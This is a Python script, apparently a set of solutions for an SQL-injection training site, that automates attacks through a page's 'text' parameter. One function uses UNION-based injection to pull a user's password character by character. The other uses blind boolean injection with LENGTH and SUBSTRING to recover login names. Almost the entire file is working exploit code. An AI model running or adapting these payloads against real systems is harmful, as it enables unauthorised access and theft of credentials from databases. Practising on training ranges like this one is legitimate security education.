import requests
from lxml import html
#https://sql.training.hackerdom.ru/9almost.php
def sql_8():
    url = 'https://sql.training.hackerdom.ru/8qqqwwweeerrr.php'
    alph = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_-"
    len_pass = 9
    num_char = 0

    while True: 

        for char in alph:
            req = f"-1 UNION select id,login,pass from users where login='fast' and SUBSTRING(pass,{num_char+1},1)='{char}'"
            r = requests.get(url,params={"text":req})
            tree = html.fromstring(r.text)
            count_zapisi = tree.xpath('//*[@class="table-count"]/text()')

            if count_zapisi[1]==' 1    ':
                print(char,end='')
                num_char += 1
                break
            
        if num_char == len_pass:
            break
    
def sql_9():
    url = 'https://sql.training.hackerdom.ru/9almost.php'
    alph = "1234567890"

    #1. узнаем длину логина
    len = []
    for i in range(20,31):
        for j in range(1,31):
            req = f"{i} and LENGTH(login)={j}"
            r = requests.get(url,params={"text":req})
            tree = html.fromstring(r.text)
            count_zapisi = tree.xpath('//*[@class="table-count"]/text()')
            if count_zapisi[1]==' 1    ':
                print(f"id={i}, len={j}")
                len.append(j)
                break
    
    #2. ищем числа в логине
    for id in range(20,31):
        for lenght in range(1,len[id-20]+1):
        #20 and SUBSTRING(login,1,1)='4'
            for char in alph:
                req = f"{id} and SUBSTRING(login,{lenght},1)='{char}'"
                r = requests.get(url,params={"text":req})
                tree = html.fromstring(r.text)
                count_zapisi = tree.xpath('//*[@class="table-count"]/text()')
                if count_zapisi[1]==' 1    ':
                    print(char,end='')
                    break
        print()

if __name__ == '__main__':
    sql_8()
    sql_9()